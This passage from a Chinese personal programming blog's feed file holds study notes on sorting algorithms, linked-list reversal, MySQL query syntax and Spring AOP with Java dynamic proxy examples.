：假设被排序的数列中有N个数。遍历一趟的时间复杂度是O(N)，需要遍历多少次呢？N-1次因此，选择排序的时间复杂度是 n^2 。</p><p>选择排序是稳定的算法，它满足稳定算法的定义：假设在数列中存在a[i]=a[j]，若在排序之前，a[i]在a[j]前面；并且排序之后，a[i]仍然在a[j]前面。则这个排序算法是稳定的！</p><p>引用于：通俗易懂讲解 选择排序 - 忆臻的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/29889599" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/29889599</a></p><pre><code>/* * 选择排序 *  * 参数说明：  *     a -- 待排序的数组  *     n -- 数组的长度  */void select_sort(int a[], int n){    int i;        // 有序区的末尾位置    int j;        // 无序区的起始位置    int min;    // 无序区中最小元素位置    for(i=0; i&lt;n; i++)    {        min=i;        //找&quot;a[i+1]..a[n]&quot;之间最小元素，并赋给min        for(j=i+1; j&lt;n; j++)        {            if(a[j] &lt; a[min])                min=j;        }        //若min!=i，则交换 a[i] 和 a[min]。        //交换后，保证了a[0]..a[i]之间元素有序。        if(min != i)            swap(a[i], a[min]);    }}</code></pre><h2 id="四、归并排序"><a href="#四、归并排序" class="headerlink" title="四、归并排序"></a>四、归并排序</h2><p>把两个或多个已经有序的序列合并成一个，时间复杂度O(nlog n)，空间复杂度O(n)，归并排序是稳定的。</p><pre><code>int *B = (int *)malloc(n*sizeof(int));//辅助函数B//A[low_mid]和A[mid+1...high]各自有序，将两个部分归并void Merge(int A[],int low,int mid,int high){    int i,j,k;    //复制数组    for(k = low;k&lt;=high;k++)        B[k] = A[k];    //选择判断排序        for(i=low,j=mid+1,k=i;i&lt;=mid&amp;&amp;j&lt;=high;k++){        if(B[i]&lt;=B[j]){            A[k] = B[i++];        }else{            A[k] = B[j++];        }    }    //对剩下部分有序序列进行复制    while(i&lt;=mid) A[k++] = B[i++];    while(i&lt;=high) A[k++] = B[j++];}//使用递归的方式调用void MergeSort(int A[],int low,int high){    if(low&lt;high){        int mid = (low + high)/2;        MergeSort(A,low,mid);//对左半部分归并排序        MergeSort(A,mid+1,high);//对右半部分归并排序        Merge(A,low,mid,high);//归并    }}</code></pre><h2 id="五、插入排序"><a href="#五、插入排序" class="headerlink" title="五、插入排序"></a>五、插入排序</h2><p>插入排序的平均时间复杂度也是 O(n^2)，空间复杂度为常数阶 O(1)，具体时间复杂度和数组的有序性也是有关联的。</p><p>判断当前数值与前一个数值的大小，如果小于则替换，一直循环比较并替换完成最小的值，然后进入下一次循环。</p><pre><code>for (int i = 0; i &lt; n; i++) {    // 寻找元素 arr[i] 合适的插入位置   for( int j = i ; j &gt; 0 ; j -- )        if( arr[j].compareTo( arr[j-1] ) &lt; 0 )//arr[j] &lt; arr[j-1]            swap( arr, j , j-1 );        else            break;}private static void swap(Object[] arr, int i, int j) {        Object t = arr[i];        arr[i] = arr[j];        arr[j] = t;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法常规解答</title>
      <link href="/2021/12/15/suan-fa-chang-gui-jie-da/"/>
      <url>/2021/12/15/suan-fa-chang-gui-jie-da/</url>
      
        <content type="html"><![CDATA[<h2 id="一、迭代法"><a href="#一、迭代法" class="headerlink" title="一、迭代法"></a>一、迭代法</h2><p>1.对于一个单一连续性方向的链表翻转，可以使用交踢迭代的方法解决（力扣剑指office|| 024），哪边为null哪边就为尾部：</p><pre><code>1.逐步缩减计算范围ListNode next = curr.next;2.尾部首先设置为空，其次将每个链表通过尾插法赋值while (curr != null) {            ListNode next = curr.next;            curr.next = prev;            prev = curr;            curr = next;        }</code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql基础语法</title>
      <link href="/2021/12/11/mysql-ji-chu-yu-fa/"/>
      <url>/2021/12/11/mysql-ji-chu-yu-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="一、where子句常用查询条件"><a href="#一、where子句常用查询条件" class="headerlink" title="一、where子句常用查询条件"></a>一、where子句常用查询条件</h2><table><thead><tr><th align="center">谓词</th><th align="center">查询条件</th></tr></thead><tbody><tr><td align="center">确定范围</td><td align="center">between and, not between and</td></tr><tr><td align="center">确定集合</td><td align="center">in, not in</td></tr><tr><td align="center">字符匹配</td><td align="center">like, not like</td></tr><tr><td align="center">空值</td><td align="center">is null, is not null</td></tr></tbody></table><h2 id="二、like关键字说明"><a href="#二、like关键字说明" class="headerlink" title="二、like关键字说明"></a>二、like关键字说明</h2><pre><code>1.like ‘刘%’  ：查询所有姓刘学生的信息；2.like &#39;欧阳_&#39; : 查询姓为欧阳三个汉字的学生信息；3.like &#39;_阳%&#39; : 查询第二个字为阳的所有学生信息；4.like &#39;DB\_abc&#39; escape&#39;\&#39; :查询DB_abc的信息，&#39;\&#39;为换码字符（转义）5.like &#39;DB\_%i__&#39; escape&#39;\&#39; : 查询以“DB_”开头，且倒数第三个字符为i的信息；</code></pre><h2 id="三、order-by-排序（跟where使用）"><a href="#三、order-by-排序（跟where使用）" class="headerlink" title="三、order by 排序（跟where使用）"></a>三、order by 排序（跟where使用）</h2><pre><code>1.order by ‘xx属性’ asc : 升序；2.order by ‘xx属性’ desc : 降序；例：where xx = &quot;xx&quot; order by ‘xx属性’ asc ;</code></pre><h2 id="四、聚集函数"><a href="#四、聚集函数" class="headerlink" title="四、聚集函数"></a>四、聚集函数</h2><table><thead><tr><th align="center">count( [distinct|all] &lt;列名&gt;)</th><th align="center">统计列个数</th></tr></thead><tbody><tr><td align="center">sum( [distinctall] &lt;列名&gt;)</td><td align="center">计算总额</td></tr><tr><td align="center">avg( [distinctall] &lt;列名&gt;)</td><td align="center">计算平均值</td></tr><tr><td align="center">max( [distinctall] &lt;列名&gt;)</td><td align="center">最大值</td></tr><tr><td align="center">min( [distinctall] &lt;列名&gt;)</td><td align="center">最小值</td></tr></tbody></table><p>distinct：过滤重复项</p><p>all：查询所有值</p><p>聚集函数只能用于select语句和group by 中的having子句，where表达式不允许使用</p><h2 id="五、group-by-子句"><a href="#五、group-by-子句" class="headerlink" title="五、group by 子句"></a>五、group by 子句</h2><pre><code>例：where xx = &quot;xx&quot; group by Sno having count(*)&gt;3;</code></pre><p>根据条件进行分组，并判断分组中Sno是否超过3；</p><h2 id="六、连接查询"><a href="#六、连接查询" class="headerlink" title="六、连接查询"></a>六、连接查询</h2><p>1、等值连接和非等值连接：通过“=”连接起来，对于null的数据项忽略；</p><p>2、自身连接：同一个数据表定义不同别名，并通过条件连接起来；</p><p>3、外连接（对于null的数据项不忽略）：</p><p>​            左连接（left join)：以左边的表为基准连接右边的表;</p><p>​            右连接（right join): 以右边的表为基准连接左边的表；</p><pre><code>例：from A join B on a.no=b.no //连接    from A left join B on a.no=b.no     from A right join B using(no)//去除no重复值</code></pre><p>4、多表连接：</p><p>​    where A.no = B.no and C.co = B.co;</p><p>5、嵌套查询：</p><p>​    where no in(select no from xxx) //子查询语句不能使用order by </p><h2 id="七、集合查询"><a href="#七、集合查询" class="headerlink" title="七、集合查询"></a>七、集合查询</h2><p>主要包括并操作union、交操作intersect和差操作except;</p><pre><code>例：查询语句1 union 查询语句2</code></pre><h2 id="八、带exists的谓词子查询"><a href="#八、带exists的谓词子查询" class="headerlink" title="八、带exists的谓词子查询"></a>八、带exists的谓词子查询</h2><p>带exists的谓词子查询不返回任何数据，只产生逻辑“true”或”false“。</p><pre><code>例：Student where exists (select * from SC where no = Student.no and cno =&#39;1&#39;)</code></pre><h2 id="九、其他"><a href="#九、其他" class="headerlink" title="九、其他"></a>九、其他</h2><p>1、常见按条件查询所有数据可以是按表间连接中某一字段等于进行查询。</p><p>2、having有且的意思。</p><p>3、解题技巧：</p><p>​        增加表减轻复杂度：可以重新定义表然后重命名，根据表中内容进行条件判断；</p><p>4、over函数可以直接跟在select属性后面，over函数里可以加order by进行排序，对于计算多个id的值需要进行排序计算。（比如ID，日期的加减，需要用到over对ID进行排序后才能进行计算）</p><p>5、row_number()：获取当前行数（从1开始）。</p><p>6、count(1) and count(字段)：<br>     两者的主要区别是<br> （1） count(1) 会统计表中的所有的记录数，包含字段为null 的记录。<br> （2） count(字段) 会统计该字段在表中出现的次数，忽略字段为null 的情况。即不统计字段为null 的记录。</p><p>7、循序递增的id-循序递增是值 = 固定值</p><p>​    例：2-1=1,3-2=1。</p><p>8、IFNULL() 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。</p><p>IFNULL() 函数语法格式为：</p><pre><code>IFNULL(expression, alt_value)</code></pre><p>9、LIMIT与OFFSET的使用</p><p>limit 与 offset：从下标0开始</p><p>   offset X  是跳过X个数据</p><p>   limit Y   是选取Y个数据</p><p>   limit  X,Y 中X表示跳过X个数据，读取Y个数据</p><pre><code>from table limit 2,1;//跳过2条取出1条数据，limit后面是从第2条开始读，读取1条信息，即读取第3条数据from table limit 2 offset 1;//从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条</code></pre><p>10、SET N := N-1; “:=”表示覆盖之前的值</p><p>11、mysql中where后为什么不能使用select中定义的别名：</p><pre><code>因为mysql中sql语句的书写顺序与执行顺序不同        sql书写顺序：select 查询内容 from 表 where 查询条件        sql执行顺序: from 表 where 查询条件 select 查询内容</code></pre><p>12、limit 不支持子查询</p><pre><code>错：select * from my_table where id in (select id from my_table limit 10)解决方案：select * from my_table where id in (select t.id from (select * from my_table limit 10)as t) </code></pre>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>397整数替换</title>
      <link href="/2021/11/20/397-zheng-shu-ti-huan/"/>
      <url>/2021/11/20/397-zheng-shu-ti-huan/</url>
      
        <content type="html"><![CDATA[<p>当 n为偶数时，我们只有唯一的方法将 n 替换为 n/2；</p><p>当 n 为奇数时，n除以 4 的余数要么为 1，要么为 3。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>spring aop</title>
      <link href="/2021/02/20/spring-aop/"/>
      <url>/2021/02/20/spring-aop/</url>
      
        <content type="html"><![CDATA[<h3 id="一、Spring-AOP介绍和概念"><a href="#一、Spring-AOP介绍和概念" class="headerlink" title="一、Spring AOP介绍和概念"></a>一、Spring AOP介绍和概念</h3><h4 id="1-AOP"><a href="#1-AOP" class="headerlink" title="1.AOP"></a>1.AOP</h4><p>AOP（Aspect Oriented Programming），即面向切面编程，是OOP的补充，它也提供了模块化。在面向对象编程中，关键的单元是对象，AOP的关键单元是切面，或者说关注点（可以简单地理解为你程序中的独立模块）。一些切面可能有集中的代码，但是有些可能被分散或者混杂在一起，例如日志或者事务。这些分散的切面被称为横切关注点。一个横切关注点是一个可以影响到整个应用的关注点，而且应该被尽量地集中到代码的一个地方，例如事务管理、权限、日志、安全等。</p><p>AOP让你可以使用简单可插拔的配置，在实际逻辑执行之前、之后或周围动态添加横切关注点。这让代码在当下和将来都变得易于维护。如果你是使用XML来使用切面的话，要添加或删除关注点，你不用重新编译完整的源代码，而仅仅需要修改配置文件就可以了。</p><p>总而言之，AOP就是使用不修改源代码的方式，在主干功能里添加或者加强新的功能。</p><h4 id="2、Spring-AOP-中的一些概念"><a href="#2、Spring-AOP-中的一些概念" class="headerlink" title="2、Spring AOP 中的一些概念"></a>2、Spring AOP 中的一些概念</h4><p><strong>切面(Aspect)</strong>：AOP核心就是切面，它将多个类的通用行为封装成可重用的模块，该模块含有一组API提供横切功能。比如，一个日志模块可以被称作日志的AOP切面。根据需求的不同，一个应用程序可以有若干切面。在Spring AOP中，切面通过带有@Aspect注解的类实现。(是动作，把通知应用到切入点过程)</p><p><strong>连接点(Join Point)</strong>：在程序执行过程中的一点，例如方法的执行或异常的处理。在Spring AOP中，连接点始终代表方法的执行。(类中哪些方法可以被增强，这些方法称为连接点)</p><p><strong>通知(Advice)</strong>：AOP在特定的切入点上执行的增强处理，有before, after, afterReturning, afterThrowing, around (实际被增强的部分)</p><p><strong>切入点（Pointcut）</strong>：决定处理如权限校验、日志记录等在何处切入业务代码中（即织入切面）。切点分为execution方式和annotation方式。前者可以用路径表达式指定哪些类织入切面，后者可以指定被哪些注解修饰的代码织入切面。(实际被真正增强的方法)</p><p><strong>引介（Introduction）</strong>：引介让一个切面可以声明被通知的对象实现了任何他们没有真正实现的额外接口，而且为这些对象提供接口的实现使用 @DeclareParaents 注解来生成一个引介。</p><p><strong>目标对象（Target object）</strong>：一个或多个切面通知的对象。也称为通知对象。由于Spring AOP是使用运行时代理实现的，因此该对象将始终是代理对象。</p><p><strong>AOP代理（AOP proxy）</strong>：由AOP框架创建的对象，用于实施Aspect（处理方法执行等）。在Spring Framework中，AOP代理将是JDK动态代理或CGLIB代理。</p><p><strong>织入（Weaving）</strong>：织入，就是通过动态代理，在目标对象方法中执行处理内容的过程。</p><h4 id="3、通知的类型"><a href="#3、通知的类型" class="headerlink" title="3、通知的类型"></a>3、通知的类型</h4><p>通知(advice)是你在你的程序中想要应用在其他模块中的横切关注点的实现。Advice主要有以下5种类型：</p><p><strong>前置通知(Before Advice)</strong>: 在连接点之前执行的Advice，不过除非它抛出异常，否则没有能力中断执行流。使用<br>@Before 注解使用这个Advice。<br><strong>返回之后通知(After Retuning Advice)也称最终通知</strong>:<br>在连接点正常结束之后执行的Advice。例如，如果一个方法没有抛出异常正常返回。通过 @AfterReturning 关注使用它。<br><strong>抛出（异常）后执行通知(After Throwing Advice)也称异常通知</strong>:<br>如果一个方法通过抛出异常来退出的话，这个Advice就会被执行。通过 @AfterThrowing 注解来使用。<br><strong>后置通知(After Advice)</strong>:<br>无论连接点是通过什么方式退出的(正常返回或者抛出异常)都会执行在结束后执行这些Advice。通过 @After 注解使用。<br><strong>围绕通知(Around Advice)也称环绕通知</strong>:<br>围绕连接点执行的Advice，就你一个方法调用。这是最强大的Advice。通过@Around 注解使用。</p><h4 id="4、在Spring-AOP中关注点和横切关注点有什么不同？"><a href="#4、在Spring-AOP中关注点和横切关注点有什么不同？" class="headerlink" title="4、在Spring AOP中关注点和横切关注点有什么不同？"></a>4、在Spring AOP中关注点和横切关注点有什么不同？</h4><p><code>关注点</code>：是我们想在应用的模块中实现的行为。关注点可以被定义为：我们想实现以解决特定业务问题的方法。<br> <code>横切关注点</code>：是贯穿整个应用程序的关注点。像日志、安全和数据转换，它们在应用的每一个模块都是必须的，所以他们是一种横切关注点。</p><h3 id="二、AOP的底层原理"><a href="#二、AOP的底层原理" class="headerlink" title="二、AOP的底层原理"></a>二、AOP的底层原理</h3><h4 id="1-AOP底层使用动态代理"><a href="#1-AOP底层使用动态代理" class="headerlink" title="1.AOP底层使用动态代理"></a>1.AOP底层使用动态代理</h4><p>有两种情况的动态代理</p><p>(1) 有接口情况使用JDK代理</p><p>创建接口实现类代理对象</p><p>(2) 没有接口的情况使用CGLIB动态代理</p><p>创建当前类子类的代理对象</p><h4 id="2-使用-JDK-动态代理"><a href="#2-使用-JDK-动态代理" class="headerlink" title="2.使用 JDK 动态代理"></a>2.使用 JDK 动态代理</h4><p>使用 JDK 动态代理，使用 Proxy 类里面的方法创建代理对象 java.lang.reflect.Proxy</p><p>(1)调用newProxyInstance方法</p><pre class=" language-java"><code class="language-java">start object <span class="token function">newProxyInstance</span><span class="token punctuation">(</span>ClassLoader<span class="token punctuation">,</span>类<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> interfaces<span class="token punctuation">,</span>InvocationHandler h<span class="token punctuation">)</span></code></pre><p>方法有三个参数：</p><p> 第一参数ClassLoder，类加载器 </p><p>第二参数类&lt;?&gt;[] interfaces，增强方法所在的类，这个类实现的接口，支持多个接口 </p><p>第三参数InvocationHandler，实现这个接口 InvocationHandler，创建代理对象，写增强的部分</p><p>代码演示</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserDao</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 2数相加     */</span>    <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     *     * @param id     */</span>    <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span>String id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserDao</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"add方法执行了..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> a<span class="token operator">+</span>b<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span>String id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"update方法执行了"</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDKProxy</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 创建接口实现类代理对象</span>        Class<span class="token punctuation">[</span><span class="token punctuation">]</span> interfaces <span class="token operator">=</span> <span class="token punctuation">{</span>UserDao<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*第三个参数传入匿名内部类        Proxy.newProxyInstance(JDKProxy.class.getClassLoader(), interfaces, new InvocationHandler() {            @Override            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {                return null;            }        });*/</span>        UserDaoImpl userDaoImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserDaoImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        UserDao dao <span class="token operator">=</span> <span class="token punctuation">(</span>UserDao<span class="token punctuation">)</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>JDKProxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> interfaces<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">UserDaoProxy</span><span class="token punctuation">(</span>userDaoImpl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> dao<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"sum = "</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * 创建代理对象 */</span><span class="token keyword">class</span> <span class="token class-name">UserDaoProxy</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> Object obj<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 1、创建的是谁的对象，就把谁传递过来</span>    <span class="token keyword">public</span> <span class="token function">UserDaoProxy</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>obj <span class="token operator">=</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 增强的逻辑     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object proxy<span class="token punctuation">,</span> Method method<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 方法之前</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"方法之前执行..."</span> <span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":传递的参数"</span> <span class="token operator">+</span> Arrays<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 被增强的方法执行</span>        Object res <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 方法之后</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"方法之后执行"</span> <span class="token operator">+</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="三、Spring-AOP的实现"><a href="#三、Spring-AOP的实现" class="headerlink" title="三、Spring AOP的实现"></a>三、Spring AOP的实现</h3><p>基于Java的主要AOP实现有：<code>AspectJ</code> <code>Spring AOP</code> <code>JBoss AOP</code></p><h4 id="1、准备工作"><a href="#1、准备工作" class="headerlink" title="1、准备工作"></a>1、准备工作</h4><p>（1）Spring 框架一般都是基于 AspectJ 实现 AOP 操作</p><p>AspectJ 不是 Spring 组成部分，独立 AOP 框架，一般把 AspectJ 和 Spirng 框架一起使用，进行 AOP 操作</p><p>（2）基于 AspectJ 实现 AOP 操作</p><pre><code>基于 xml配置文件实现基于注解方式实现（使用）</code></pre><p>（3）工程中，引入Spring AOP相关的依赖</p><p><img src="assets/image-20220220173003058.png" alt="image-20220220173003058"></p><p>（4）切入点表达式（ Point Cut Expression）</p><p><code>切入点表达式作用</code>：知道对哪个类里面的哪个方法进行增强<br> <code>语法结构</code>：</p><pre><code>execution([权限修饰符] [返回类型] [类全路径] [方法名称]([参数列表]) )</code></pre><pre><code>举例 1：对 com.micah.dao.BookDao 类里面的 add 进行增强 execution(* com.atguigu.dao.BookDao.add(..))举例 2：对 com.micah.dao.BookDao 类里面的所有的方法进行增强execution(* com.atguigu.dao.BookDao.* (..))举例 3：对 com.atguigu.dao 包里面所有类，类里面所有方法进行增强execution(* com.micah.dao.*.* (..))</code></pre><p>其它切入类型：</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(public * *(..))"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">anyPublicOperation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"within(com.xyz.someapp.trading..*)"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">inTrading</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"anyPublicOperation() &amp;&amp; inTrading()"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">tradingOperation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><p><strong>常见切入点表达式的一些示例在下面给出。</strong></p><pre class=" language-java"><code class="language-java">the execution of any <span class="token keyword">public</span> method<span class="token function">execution</span><span class="token punctuation">(</span><span class="token keyword">public</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span>名称以“ set”开头的任何方法的执行：<span class="token function">execution</span><span class="token punctuation">(</span><span class="token operator">*</span> set<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span>AccountService接口定义的任何方法的执行：<span class="token function">execution</span><span class="token punctuation">(</span><span class="token operator">*</span> com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span>AccountService<span class="token punctuation">.</span>*<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span>the execution of any method defined in the service <span class="token keyword">package</span><span class="token operator">:</span><span class="token function">execution</span><span class="token punctuation">(</span><span class="token operator">*</span> com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span>*<span class="token punctuation">.</span>*<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span>服务包或子包中定义的任何方法的执行：<span class="token function">execution</span><span class="token punctuation">(</span><span class="token operator">*</span> com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span><span class="token punctuation">.</span>*<span class="token punctuation">.</span>*<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span>服务包中的任何连接点（仅在Spring AOP中执行方法）：<span class="token function">within</span><span class="token punctuation">(</span>com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span>*<span class="token punctuation">)</span>服务包或子包中的任何连接点（仅在Spring AOP中执行方法）：<span class="token function">within</span><span class="token punctuation">(</span>com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span><span class="token punctuation">.</span>*<span class="token punctuation">)</span>代理实现AccountService接口的任何连接点（仅在Spring AOP中是方法执行） ：<span class="token keyword">this</span><span class="token punctuation">(</span>com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span>AccountService<span class="token punctuation">)</span></code></pre><h4 id="2、AspectJ"><a href="#2、AspectJ" class="headerlink" title="2、AspectJ"></a>2、AspectJ</h4><p>启用@AspectJ支持后，@AspectSpring将自动检测在应用程序上下文中使用@AspectJ方面（具有注释）的类定义的任何bean，并将其用于配置Spring AOP。</p><p>(1) 创建类，在类里面定义方法，添加@Component注解，创建对象</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 前置通知     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"add......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>（2）创建增强类（编写增强逻辑），在增强类里面，创建方法，让不同方法代表不同通知类型</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Aspect</span>     <span class="token comment" spellcheck="true">// 生成代理对象</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserProxy</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 相同切入点抽取     */</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"execution(* com.micah.spring.aopnno.User.add(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">pointCut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 前置通知     * @Before注解表示作为前置通知     * @Order 有多个增强类多同一个方法进行增强，设置增强类优先级，数字越小等级越高     */</span>    <span class="token annotation punctuation">@Order</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Before</span><span class="token punctuation">(</span>value 